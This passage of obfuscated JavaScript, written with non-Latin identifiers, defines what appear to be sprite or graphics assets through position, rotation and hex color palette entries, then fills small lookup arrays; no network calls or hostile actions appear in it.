				f: ⵠᐃⵠⵠⲆⲆⲆ,
				x: ᐃⵠⲆ,
				y: ᐃΔΔ,
				a: 1,
				r: Δᐃᐃⵠ,
				c: [ⵠ[111], ⵠ[516], ⵠ[382], "#756e52", "#663f22", "#9e9577"]
			}], .45, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃⲆΔ] = ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃⲆᐃ];
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔⵠⲆ] = ᐃⲆⲆᐃ(ΔⲆᐃᐃ, [{
				f: ⲆⲆᐃⵠⲆᐃⲆ,
				x: -2,
				y: -ᐃⵠⲆⲆⲆ,
				a: 1,
				r: ΔΔⵠ,
				c: [ⵠ[111], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[288], ⵠ[221]]
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.Δᐃⵠᐃᐃⵠⵠ] = ⵠⲆ[Ⲇ.ᐃⵠΔᐃΔⵠⲆ];
			ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⵠⲆᐃᐃᐃⵠ,
				x: 0,
				y: ΔⲆⲆ,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⲆⲆΔᐃⵠ] = ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠⵠ];
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃⲆΔⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⲆᐃⵠⲆᐃⲆ,
				x: ⵠⲆⲆ,
				y: 0,
				a: 1,
				r: ᐃⵠⲆ,
				c: [ⵠ[111], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃΔⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆᐃᐃⲆΔⵠ];
			ⵠⲆ[Ⲇ.ⵠⲆΔΔΔⵠⵠ] = ᐃⲆⲆᐃ(ΔⲆⵠ, [{
				f: ᐃⵠᐃΔᐃⵠⵠ,
				x: 0,
				y: Ⲇᐃᐃᐃ,
				a: Ⲇᐃⵠ,
				r: ⲆΔⵠ,
				c: [ⵠ[111], ⵠ[328], ⵠ[227], ⵠ[ⵠⵠᐃΔΔ], ⵠ[31], ⵠ[167]]
			}], .4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔΔᐃⵠᐃᐃ] = ⵠⲆ[Ⲇ.ⵠⲆΔΔΔⵠⵠ];
			ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⲆᐃⲆⵠⲆ,
				x: Δᐃᐃⵠ,
				y: ᐃⵠΔ,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[387], ⵠ[549], ⵠ[0], ⵠ[549], ⵠ[387]]
			}], .45, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⲆΔᐃᐃⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃΔⲆΔᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆᐃΔ] = ᐃⲆⲆᐃ(ΔΔᐃⵠ, [{
				f: ᐃΔᐃⲆⲆΔⲆ,
				x: 0,
				y: ᐃⵠΔ,
				a: ΔⲆⵠ,
				r: 0,
				c: [ⵠ[111], ⵠ[237], ⵠ[24], ⵠ[387], ⵠ[549], ⵠ[Δᐃᐃᐃ], ⵠ[549], ⵠ[387]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔΔΔΔⲆᐃΔ] = ⵠⲆ[Ⲇ.ⲆⲆΔΔⲆᐃΔ];
			ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⵠⲆᐃᐃⵠ,
				x: ᐃⵠⲆ,
				y: Δᐃᐃᐃ,
				a: ⵠᐃⵠΔ,
				r: ΔᐃΔΔ,
				c: [ⵠ[111], ⵠ[237], ⵠ[24], ⵠ[328], ⵠ[227], ⵠ[17], ⵠ[31], ⵠ[167]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔΔⲆⲆⵠΔᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆⲆⲆⵠΔ];
			ⵠⲆ[Ⲇ.ᐃΔⲆⵠΔⵠⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⵠⲆᐃᐃⵠ,
				x: 0,
				y: 0,
				a: ⲆⵠⲆⲆ,
				r: 0,
				c: [ⵠ[111], "#7d8b90", "#9facaa", ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃᐃⵠⲆ] = ⵠⲆ[Ⲇ.ᐃΔⲆⵠΔⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⵠⲆΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆᐃⲆⵠⲆⲆⵠ,
				x: 0,
				y: ⵠⲆⲆ,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[237], ⵠ[24], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[288], ⵠ[221]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⵠⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⵠⲆᐃⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆᐃⲆⵠⲆⲆⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[237], ⵠ[24], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆⵠⲆᐃᐃⵠ] = ⵠⲆ[Ⲇ.ⵠⲆⵠⵠⵠΔⲆ];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠᐃⲆᐃΔᐃ,
				x: Δᐃᐃᐃ,
				y: ⵠΔⲆⵠ,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[80], ⵠ[261], "#644928", ⵠ[261], "#735534"]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃᐃⵠΔⲆᐃᐃ] = ⵠⲆ[Ⲇ.ⲆⵠⲆᐃⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆΔⵠⵠⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: 0,
				c: [ⵠ[111], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[221], ⵠ[288]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠᐃᐃΔ] = ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃⲆⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃᐃⲆ] = ᐃⲆⲆᐃ(ᐃᐃⲆΔ, [{
				f: ⲆΔⵠⵠⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: ΔΔⵠ,
				c: [ⵠ[111], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⵠΔⲆⲆᐃⵠ] = ⵠⲆ[Ⲇ.ⵠⵠᐃᐃᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ΔⵠⵠΔⵠⵠΔ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆⲆΔΔⲆⲆⲆ,
				x: 0,
				y: ΔⲆⲆ,
				a: ΔⵠⲆΔ,
				r: 0,
				c: [ⵠ[111], ⵠ[328], ⵠ[227], ⵠ[ⲆᐃᐃⲆΔ], "#9a8636", ⵠ[167]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃΔᐃⵠⵠⲆΔ] = ⵠⲆ[Ⲇ.ΔⵠⵠΔⵠⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⲆⲆᐃⵠⵠ,
				x: 0,
				y: 0,
				a: ΔᐃⲆⵠ,
				r: 0,
				c: [ⵠ[111], ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]
			}], .6, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔΔΔⲆᐃᐃΔ] = ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⲆᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⲆᐃᐃᐃᐃ,
				x: ᐃⵠⲆⵠ,
				y: 2,
				a: 1,
				r: ᐃⵠⲆ,
				c: [ⵠ[30], "#9e8838", ⵠ[40], ⵠ[80], ⵠ[16], ⵠ[ⵠᐃⵠⵠⲆ], ⵠ[16], ⵠ[40], ⵠ[40], ⵠ[40]]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔⵠ] = ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⲆᐃ];
			ⵠⲆ[Ⲇ.ΔⲆΔΔⵠⵠᐃ] = ᐃⲆⲆᐃ(ⵠΔⵠΔ, [{
				f: ⵠⵠⲆᐃⲆΔⵠ,
				x: 0,
				y: -3,
				a: ᐃᐃⲆΔ,
				r: 0,
				c: ["#dd5d57", ⵠ[407], "#5e5d5e", ⵠ[407]]
			}], 1.4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠⵠⲆᐃⲆΔⵠ,
				x: 0,
				y: -ⵠᐃⵠⲆ,
				a: ⵠᐃⵠΔ,
				r: Δᐃᐃⵠ,
				c: ["#602920", "#844f49", "#5e5d5e", "#d3ccc7"]
			}], 1.4, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃΔⵠΔ] = ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔᐃⵠ];
			ⵠⲆ[Ⲇ.ⲆΔΔᐃᐃⲆᐃ] = ᐃⲆⲆᐃ(ΔᐃⲆⵠ, [{
				f: ⵠⵠⵠⵠⲆᐃᐃ,
				x: -3,
				y: -ᐃᐃⲆⲆ,
				a: ΔᐃⲆⵠ,
				r: Δᐃᐃⵠ,
				c: ["#cec0c4", ⵠ[407], "#6d6768"]
			}], .9, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ΔⲆΔΔΔΔⲆ] = ᐃⲆⲆᐃ(ᐃⲆᐃ, [{
				f: ⵠⵠⵠⵠⲆᐃᐃ,
				x: -3,
				y: -3,
				a: 1,
				r: ᐃⵠⲆⵠ,
				c: ["#d4e9ec", "#37b1d7", "#506c71"]
			}], .9, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃᐃΔ] = ⵠⲆ[Ⲇ.ΔⲆΔΔΔΔⲆ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⵠΔᐃᐃⲆ,
				x: -ΔΔᐃΔ,
				y: -ⲆᐃΔᐃ,
				a: 1,
				r: ᐃΔΔ,
				c: ["#ef96be", ⵠ[407]]
			}], .5, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔΔⲆⲆΔΔⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⵠΔᐃᐃⲆ,
				x: -3,
				y: -ⲆΔⵠⵠ,
				a: ᐃΔᐃⲆ,
				r: Ⲇᐃⵠⵠ,
				c: ["#55423e", ⵠ[407]]
			}], .5, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃᐃΔᐃᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ΔΔⵠᐃⵠⲆᐃ,
				x: Δⵠᐃ,
				y: 0,
				a: 1,
				r: ᐃⵠΔ,
				c: [ⵠ[407], "#e7e2e2", "#b35c46", "#a34d37"]
			}], .25, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆⵠΔⵠᐃᐃⵠ] = ᐃⲆⲆᐃ(Ⲇᐃⵠ, [{
				f: ΔΔⵠᐃⵠⲆᐃ,
				x: Δᐃᐃᐃ,
				y: Δᐃᐃᐃ,
				a: 1,
				r: 0,
				c: ["#14151b", ⵠ[339], "#b35c46", "#a34d37"]
			}], .25, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆΔⵠⲆⲆΔΔ] = ᐃⲆⲆᐃ(1, [{
				f: ΔᐃⵠΔᐃᐃⲆ,
				x: 0,
				y: Δⵠᐃ,
				a: ⵠⲆΔ,
				r: ΔⲆⵠⲆ,
				c: ["#201851", "#b6222a"]
			}], .5, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⲆΔΔⵠⵠⲆⲆ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ΔᐃⵠΔᐃᐃⲆ,
				x: -ᐃᐃⲆΔⵠ,
				y: -3,
				a: 1,
				r: 0,
				c: ["#231f20", "#b6222a"]
			}], .5, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔⵠΔⲆᐃⵠΔ] = ᐃⲆⲆᐃ(ᐃᐃⵠ, [{
				f: ΔᐃⵠΔᐃᐃⲆ,
				x: -3,
				y: -3,
				a: 1,
				r: 0,
				c: [ⵠ[407], "#b6222a"]
			}], .5, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠⲆ] = ᐃⲆⲆᐃ(1, [{
				f: ΔⵠⵠᐃⵠᐃΔ,
				x: ᐃⵠⲆ,
				y: ⵠᐃⲆᐃ,
				a: 1,
				r: 0,
				c: [ⵠ[440], ⵠ[369], ⵠ[510], ⵠ[340]]
			}], .4, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠᐃⲆⵠ] = ⵠⲆ[Ⲇ.ⵠᐃᐃⵠᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃᐃⵠ] = ᐃⲆⲆᐃ(ⲆⵠⲆⲆ, [{
				f: ᐃᐃᐃᐃΔᐃⵠ,
				x: ᐃΔΔ,
				y: ⲆΔⵠ,
				a: ⵠΔⵠΔ,
				r: Ⲇᐃⵠⵠ,
				c: [ⵠ[510], ⵠ[340], ⵠ[440], ⵠ[369]]
			}], .4, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠΔⵠⲆ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⵠᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃⲆⲆⵠⲆⵠⵠ,
				x: 0,
				y: 0,
				a: 1,
				r: ⵠⲆⲆ,
				c: [ⵠ[566], "#dee7e7", "#b8cccb", ⵠ[407], "#e3e8e8"]
			}], .4, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠΔᐃⵠᐃⲆΔ] = ⵠⲆ[Ⲇ.ⲆⲆΔⵠᐃⲆⵠ];
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠΔᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ᐃᐃⲆΔᐃⵠΔ,
				x: 0,
				y: 5,
				a: ᐃⲆᐃ,
				r: 0,
				c: [ⵠ[566], "#c5232c", "#84191d", "#a72027", ⵠ[503], ⵠ[256]]
			}], .35, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃⵠᐃᐃⵠᐃ] = ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠΔᐃ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⲆᐃᐃᐃ] = ᐃⲆⲆᐃ(1, [{
				f: ⲆᐃᐃⲆⲆⲆΔ,
				x: 0,
				y: 5,
				a: ᐃⲆᐃ,
				r: 0,
				c: [ⵠ[566], "#0f964c", "#106e3b", "#138344", ⵠ[503], ⵠ[ⲆᐃΔᐃⵠⵠⵠ], "#C5232C", "#A92D2D"]
			}], .35, [ⵠ[113], ⵠ[392], ⵠ[444]], .5);
			ⵠⲆ[Ⲇ.ΔᐃᐃΔⲆᐃⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⲆᐃᐃᐃ];
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆᐃΔ] = ᐃⲆⲆᐃ(ᐃⲆᐃ, [{
				f: ⵠᐃΔᐃⲆⵠΔⲆᐃ,
				x: -2,
				y: -ᐃⲆΔⲆ,
				a: ᐃⲆᐃ,
				r: Ⲇᐃⵠⵠ,
				c: [ⵠ[407], "#cec0c4"]
			}], .35, [ⵠ[358], ⵠ[86], ⵠ[468]], .5);
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⲆᐃⵠ] = ⵠⲆ[Ⲇ.ⲆⵠΔᐃⲆᐃΔ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ][ΔΔⵠⵠ] = ⲆΔ.ⲆᐃᐃᐃⲆⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ][1] = ⲆΔ.ⲆⵠⵠⲆᐃⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ][ᐃⲆⵠᐃΔ] = ⲆΔ.ᐃⲆⵠⲆΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⵠΔⲆⵠᐃᐃ] = ⵠⲆ[Ⲇ.ⵠⵠⲆᐃⲆⲆⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ][0] = ⲆΔ.ⲆⵠΔᐃⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ][ΔⲆⵠ] = ⲆΔ.ᐃⵠΔΔΔᐃΔ;
			ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ][2] = ⲆΔ.ΔᐃⲆΔΔⲆⲆ;
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃⵠⲆⵠ] = ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆⵠⵠᐃ] = ⵠⲆ[Ⲇ.ⲆᐃᐃⵠᐃᐃⲆ];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ][0] = ⲆΔ.ⲆⵠᐃᐃΔⵠΔ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ][ⵠⲆΔ] = ⲆΔ.ⲆⵠΔΔⲆᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ][2] = ⲆΔ.ⲆΔⵠⵠⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ΔᐃⵠⲆΔΔΔ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃᐃΔⲆ] = ⵠⲆ[Ⲇ.ⵠΔⵠΔⵠᐃⲆ];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ][ΔΔⵠⵠ] = ⲆΔ.ⵠⲆⲆⵠᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ][1] = ⲆΔ.ⵠⲆⲆⵠᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ][ⲆᐃᐃⲆ] = ⲆΔ.ⵠⲆⲆⵠᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ⵠΔⵠΔΔΔΔ] = ⵠⲆ[Ⲇ.ΔᐃΔⲆⲆΔⲆ];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ][0] = ⲆΔ.ⲆⲆᐃⵠⲆᐃΔ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ][ΔᐃᐃⲆ] = ⲆΔ.ⲆᐃⲆᐃΔᐃⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ][ⵠΔⲆᐃ] = ⲆΔ.Ⲇⵠⵠᐃⵠᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃᐃΔ] = ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⲆⲆⵠⵠ] = ⵠⲆ[Ⲇ.ⵠⲆᐃⲆⵠⲆΔ];
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ][0] = ⲆΔ.ΔⵠΔⲆΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ][ΔⲆᐃᐃ] = ⲆΔ.ΔⵠΔⲆΔᐃⲆ;
			ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ][2] = ⲆΔ.ΔⵠΔⲆΔᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃΔᐃᐃⵠ] = ⵠⲆ[Ⲇ.ΔⲆᐃᐃᐃᐃⵠ];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ][ΔΔⵠⵠ] = ⲆΔ.ΔΔᐃⲆΔΔⵠΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ][1] = ⲆΔ.ΔΔⵠⲆⲆΔᐃΔᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ][2] = ⲆΔ.ⵠᐃᐃⵠΔⲆΔΔⲆ;
			ⵠⲆ[Ⲇ.ΔᐃⵠⵠⲆᐃⵠ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠΔⵠᐃ] = ⵠⲆ[Ⲇ.ᐃⵠᐃⵠⲆⵠΔ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ][ᐃⵠΔ] = ⲆΔ.ᐃⲆⲆⲆⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ][ΔⵠΔⵠ] = ⲆΔ.ᐃⵠᐃᐃᐃᐃΔ;
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ][2] = ⲆΔ.ᐃΔⵠᐃⵠΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠᐃΔⵠ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ];
			ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⲆΔⲆ] = ⵠⲆ[Ⲇ.ᐃⲆⵠⵠⵠⲆΔ];
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ][0] = ⲆΔ.ⲆᐃⲆΔᐃⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ][ᐃΔᐃⲆ] = ⲆΔ.ᐃᐃⲆⵠⵠⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ][2] = ⲆΔ.ⵠⲆᐃᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠΔᐃ] = ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆⵠᐃ] = ⵠⲆ[Ⲇ.ᐃᐃᐃᐃⲆᐃⲆ];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ][0] = ⲆΔ.ⲆⵠΔⵠⵠⵠⵠ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ][1] = ⲆΔ.ᐃⲆⵠⲆⵠᐃΔ;
			ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ][ⵠΔᐃᐃⵠ] = ⲆΔ.ΔΔⵠᐃᐃᐃΔ;
			ⵠⲆ[Ⲇ.ΔⲆⵠΔⲆᐃⵠ] = ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃᐃⵠⲆΔᐃᐃ] = ⵠⲆ[Ⲇ.ⲆΔᐃⲆⲆⵠᐃ];
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ][0] = ⲆΔ.ⵠⵠⲆⵠΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ][ⵠΔᐃ] = ⲆΔ.ᐃⲆⲆⵠΔⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ][2] = ⲆΔ.ΔⲆⵠⵠΔᐃⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠΔⵠΔ] = ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ΔⲆΔⲆΔⵠⵠ] = ⵠⲆ[Ⲇ.ᐃᐃΔⵠⲆᐃᐃ];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ][0] = ⲆΔ.ⵠⲆⵠΔᐃᐃⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ][ⲆⵠⲆⲆ] = ⲆΔ.ⲆΔⲆΔⲆⵠⲆ;
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ][ⲆΔΔⵠ] = ⲆΔ.ΔⵠᐃᐃΔΔΔ;
			ⵠⲆ[Ⲇ.ⲆⲆⲆⵠⲆΔᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ⵠⵠⲆⲆΔⲆᐃ] = ⵠⲆ[Ⲇ.ⵠⲆⲆΔᐃⵠⲆ];
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ][ᐃⵠⲆⵠ] = ⲆΔ.ⲆⵠⲆᐃⵠⵠⲆ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ][1] = ⲆΔ.ᐃⲆⲆΔⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ][2] = ⲆΔ.ᐃⲆΔᐃΔⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆᐃᐃⲆΔ] = ⵠⲆ[Ⲇ.ᐃⲆⲆΔⲆΔᐃ];
